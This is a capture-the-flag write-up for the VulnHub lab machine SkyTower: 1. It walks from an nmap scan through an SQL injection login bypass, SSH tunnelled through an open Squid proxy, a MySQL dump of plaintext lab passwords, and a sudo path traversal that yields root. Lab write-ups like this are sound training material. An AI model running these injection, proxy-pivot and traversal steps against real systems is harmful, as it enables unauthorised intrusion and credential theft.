<h1>SkyTower: 1 Write-up</h1>

<h2>Nmap</h2>

```
PORT     STATE    SERVICE    VERSION
22/tcp   filtered ssh
80/tcp   open     http       Apache httpd 2.2.22 ((Debian))
3128/tcp open     http-proxy Squid http proxy 3.1.20
|_http-server-header: squid/3.1.20
MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)
```

<h3>PORT 80</h3>

**Sql injection :**

```
username: '-'
password: '-'
```

After Login in welcome message there is creds for john user for ssh:

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/SkyTower%3A%201/Images/creds.png)


<h3>ProxyChain</h3>

I have the creds but port 22(ssh) is not open. I again saw the nmap scan and there is **Squid http proxy** is  running on PORT 3128 so i configured Proxychains to access ssh 

```
apt install proxychains
```

Add ```http 192.168.56.101 3128``` in the end of ```/etc/proxychains.conf``` 

NOTE: IF THERE IS ANY OTHER LINE LIKE THIS YOU MUST REMOVE THAT LINE. THERE MUST TO ONLY ONE LINE AT A TIME IF YOU HAVE ANY CONFUSION CHECK [MY PROXYCHAIN FILE](https://github.com/Vanshal/Vulnhub-Writeups/blob/master/SkyTower:%201/proxychains.conf)


```
proxychains ssh john@127.0.0.1
```

Normally i can't access the shell so i gave  command from ssh itself 

```proxychains ssh john@127.0.0.1 /bin/bash```


<h2>Privilege Escalation</h2>

<h3>Mysql Enumeration</h3>

```
john@SkyTower:~$ mysql -uroot -proot
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 54
Server version: 5.5.35-0+wheezy1 (Debian)Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| SkyTech            |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.01 sec)mysql> use SkyTech;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -ADatabase changed
mysql> show tables;
+-------------------+
| Tables_in_SkyTech |
+-------------------+
| login             |
+-------------------+
1 row in set (0.00 sec)mysql> select * from login;
+----+---------------------+--------------+
| id | email               | password     |
+----+---------------------+--------------+
|  1 | john@skytech.com    | hereisjohn   |
|  2 | sara@skytech.com    | ihatethisjob |
|  3 | william@skytech.com | senseable    |
+----+---------------------+--------------+
3 rows in set (0.00 sec)mysql> exit
Bye
john@SkyTower:~$
```

Got creds for sara user :

```ssh sara@192.168.56.101 /bin/bash```

```
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/binUser sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
sara@SkyTower:~$
sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
sara@SkyTower:~$
sara@SkyTower:~$ su -
Password:**theskytower**
root@SkyTower:~# id
uid=0(root) gid=0(root) groups=0(root)
root@SkyTower:~#
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/SkyTower%3A%201/Images/flag.png)
